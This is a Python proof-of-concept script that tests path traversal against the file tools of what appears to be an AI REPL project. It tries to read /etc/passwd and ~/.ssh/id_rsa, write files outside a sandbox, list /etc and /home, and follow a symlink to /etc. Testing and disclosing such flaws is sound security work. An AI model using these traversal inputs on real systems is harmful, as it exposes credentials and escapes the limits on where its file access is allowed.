#!/usr/bin/env python3
"""
Path Traversal Vulnerability Proof of Concept
Demonstrates security issues in current tool implementation
"""

import os
import sys
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from gemini_repl.tools.codebase_tools import read_file, write_file, list_files

def demonstrate_vulnerabilities():
    """Show various path traversal attacks."""
    print("🔴 PATH TRAVERSAL VULNERABILITY DEMONSTRATION")
    print("=" * 50)
    
    # Setup
    os.chdir("/tmp")
    os.makedirs("test_sandbox", exist_ok=True)
    os.chdir("test_sandbox")
    
    print(f"Current directory: {os.getcwd()}")
    print()
    
    # Test 1: Reading parent directory files
    print("1️⃣ ATTACK: Reading files outside sandbox")
    print("-" * 40)
    
    attacks = [
        "../../../etc/passwd",
        "../../../../../../etc/hosts",
        "/etc/passwd",  # Absolute path
        "~/.ssh/id_rsa",  # Home directory
        "../" * 10 + "etc/passwd",  # Deep traversal
    ]
    
    for attack in attacks:
        print(f"Attempting: {attack}")
        result = read_file(attack)
        if "Error reading file" not in result:
            print(f"  ⚠️  SUCCESS - Read {len(result)} bytes!")
        else:
            print(f"  ✓ Failed (good)")
    
    print()
    
    # Test 2: Writing files outside sandbox
    print("2️⃣ ATTACK: Writing files outside sandbox")
    print("-" * 40)
    
    write_attacks = [
        ("../evil.txt", "Escaped sandbox!"),
        ("/tmp/evil_absolute.txt", "Absolute path write!"),
        ("../../../../../../tmp/deep_evil.txt", "Deep traversal write!"),
    ]
    
    for path, content in write_attacks:
        print(f"Attempting write to: {path}")
        result = write_file(path, content)
        if "Successfully wrote" in result:
            print(f"  ⚠️  SUCCESS - File written!")
            # Verify it exists
            if os.path.exists(path):
                print(f"  ⚠️  VERIFIED - File exists at {os.path.abspath(path)}")
        else:
            print(f"  ✓ Failed (good)")
    
    print()
    
    # Test 3: Listing files outside sandbox
    print("3️⃣ ATTACK: Listing files outside sandbox")
    print("-" * 40)
    
    list_attacks = [
        "../*",
        "../../*",
        "/etc/*",
        "../../../home/*",
    ]
    
    for pattern in list_attacks:
        print(f"Attempting pattern: {pattern}")
        result = list_files(pattern)
        if result and "No files found" not in result:
            files = result.split('\n')
            print(f"  ⚠️  SUCCESS - Found {len(files)} files!")
            print(f"  First few: {files[:3]}")
        else:
            print(f"  ✓ No files found (good)")
    
    print()
    
    # Test 4: Symlink attacks
    print("4️⃣ ATTACK: Symlink traversal")
    print("-" * 40)
    
    # Create malicious symlink
    if not os.path.exists("evil_link"):
        os.symlink("/etc", "evil_link")
    
    print("Created symlink: evil_link -> /etc")
    result = read_file("evil_link/passwd")
    if "Error reading file" not in result:
        print(f"  ⚠️  SUCCESS - Read {len(result)} bytes via symlink!")
    else:
        print(f"  ✓ Failed (good)")
    
    # Cleanup
    os.remove("evil_link") if os.path.exists("evil_link") else None
    
    print("\n🔴 VULNERABILITY CONFIRMED - NO PATH SANITIZATION!")


if __name__ == "__main__":
    demonstrate_vulnerabilities()
